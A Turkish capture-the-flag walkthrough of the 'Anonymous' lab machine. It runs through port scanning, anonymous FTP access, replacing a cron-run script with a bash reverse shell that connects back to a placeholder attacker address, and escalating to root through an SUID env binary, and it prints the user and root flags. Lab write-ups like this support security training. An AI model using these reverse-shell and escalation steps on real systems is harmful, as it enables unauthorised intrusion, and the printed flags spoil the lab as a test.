# Anonymous CTF

## Adım 1: Makineye Erişim Kontrolü
Makineye erişim olup olmadığını kontrol etmek için `ping` komutunu kullanıyoruz:
```bash
ping Machine_IP 
```
## Adım 2: Nmap Taraması
Açık portları tespit etmek için Nmap kullanıyoruz:
```bash
nmap --top-ports 100 Machine_IP
```
## Adım 3: Nmap Sonucu
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 15:16 EDT
Nmap scan report for Machine_IP
Host is up (0.077s latency).
Not shown: 96 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds
```
## Adım 4: SMB Paylaşımlarını Listeleme
139 ve 445 numaralı portlarda çalışan SMB servisini kullanarak paylaşımları listelemek için 'smbclient' komutunu kullanıyoruz:
```bash
smbclient -L Machine_IP
```
## Adım 5: SMB Paylaşım Sonuçları
Smbclient sonuçları:
```bash
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS

```
## Adım 6: FTP Servisi Tarama
Açık olan FTP servisini sömürmek için Nmap scriptlerini kullanıyoruz:
```bash
nmap --script="ftp-*" Machine_IP
```
## Adım 7: FTP Anonymous Login
FTP servisine anonymous olarak bağlanıyoruz:
```bash
ftp Machine_IP
```
FTP bağlantı çıktısı:
```bash
Connected to Machine_IP.
220 NamelessOne's FTP Server!
Name (Machine_IP:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
## Adım 8: Dosya Listesi ve İnceleme
FTP'de ls komutuyla dosya listesini görüntüleyip, dosyaları indiriyoruz:
```bash
ftp> ls
ftp> get clean.sh
ftp> get removed_files.log
ftp> get to_do.txt
```
## Adım 9: Cronjob Exploit
clean.sh dosyasını inceledikten sonra, bunun crontab'de çalışan bir script olduğunu fark ediyoruz. Kendi reverse shell scriptimizi yazıyoruz:
```bash
#!/bin/bash
bash -i >& /dev/tcp/tun0_IP/PORT 0>&1
```
## Adım 10: Netcat ile Dinleme
Netcat kullanarak bir dinleyici başlatıyoruz:
```bash
nc -nvlp PORT
```
## Adım 11: Exploit Yükleme
Hazırladığımız clean.sh scriptini makineye yüklüyoruz:
```bash
ftp> put clean.sh clean.sh
```
## Adım 12: Shell Erişimi
Crontab'in çalışmasını bekledikten sonra Netcat üzerinden shell erişimi sağlıyoruz:
```bash
listening on [any] 4444 ...
connect to [tun0_IP] from (UNKNOWN) [Machine_IP] 37538
bash: cannot set terminal process group (1245): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ ls
ls
pics
user.txt
namelessone@anonymous:~$ cat user.txt
cat user.txt
90d6f992585815ff991e68748c414740  # User flagi burada yakalıyoruz.
```
## Adım 13: Yetki Yükseltme
Root yetkisi kazanmak için SUID dosyalarını arıyoruz:
```bash
find / -type f -perm -4000 2>/dev/null
```
Ardından, sudo yetkileriyle çalıştırılabilecek komutları/dosyaları inceliyoruz:
```bash
/usr/bin/env 'i root olarak çalıştırabiliyoruz.
```
## Adım 14: Root Erişimi
env komutunu kullanarak root yetkisi elde ediyoruz:
```bash
/usr/bin/env install -m =xs $(which env) .
./env /bin/sh -p # Bundan sonra root oluyoruz
```
Root olduktan sonra root flagini buluyoruz:
```bash
cd /root
cat root.txt
4d930091c31a622a7ed10f27999af363
```
